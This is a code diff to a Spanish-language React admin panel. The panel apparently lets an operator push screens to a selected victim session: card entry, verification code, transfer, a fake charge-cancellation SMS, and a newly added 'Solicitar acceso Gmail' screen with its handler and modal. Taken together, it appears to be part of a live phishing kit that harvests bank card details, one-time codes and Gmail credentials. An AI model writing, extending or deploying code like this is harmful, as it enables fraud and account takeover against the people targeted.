@@ -460,7 +460,7 @@ export default function AdminPanel() {
     console.log("handleScreenChange recibió tipo de pantalla:", screen);
 
     // Handle modals for certain screens
-    if (["protege", "transferir", "cancelacion", "codigo", "mensaje", "sms_compra", "tarjeta"].includes(screen)) {
+    if (["protege", "transferir", "cancelacion", "codigo", "mensaje", "sms_compra", "tarjeta", "gmail"].includes(screen)) {
       console.log("Activando modal para:", screen);
       setActiveModal(screen);
       return;
@@ -662,6 +662,23 @@ export default function AdminPanel() {
     closeModal();
   };
   
+  const handleGmailModalConfirm = (data: { correo: string, mensaje: string }) => {
+    if (selectedSessionId) {
+      sendScreenChange({
+        tipo: `mostrar_${ScreenType.GMAIL}`,
+        sessionId: selectedSessionId,
+        correo: data.correo
+      });
+      
+      toast({
+        title: "Solicitud de Gmail enviada",
+        description: `Se ha solicitado el acceso a Gmail para: ${data.correo}`,
+      });
+    }
+    
+    closeModal();
+  };
+  
   // Manejar el envío de SMS
   const sendSms = useMutation({
     mutationFn: async () => {
@@ -751,6 +768,7 @@ export default function AdminPanel() {
                   <option value="cancelacion">6. Cancelación exitosa</option>
                   <option value="mensaje">7. Ingresa el mensaje que gustes</option>
                   <option value="sms_compra">8. SMS Compra - Cancelación de cargo</option>
+                  <option value="gmail">9. Solicitar acceso Gmail</option>
                 </select>
               </div>
             </div>
@@ -939,6 +957,11 @@ export default function AdminPanel() {
         isOpen={activeModal === 'sms_compra'} 
         onClose={closeModal} 
         onConfirm={handleSmsCompraConfirm} 
+      />
+      <GmailModal 
+        isOpen={activeModal === 'gmail'} 
+        onClose={closeModal} 
+        onConfirm={handleGmailModalConfirm} 
       />
       
       {/* Diálogo para enviar SMS */}
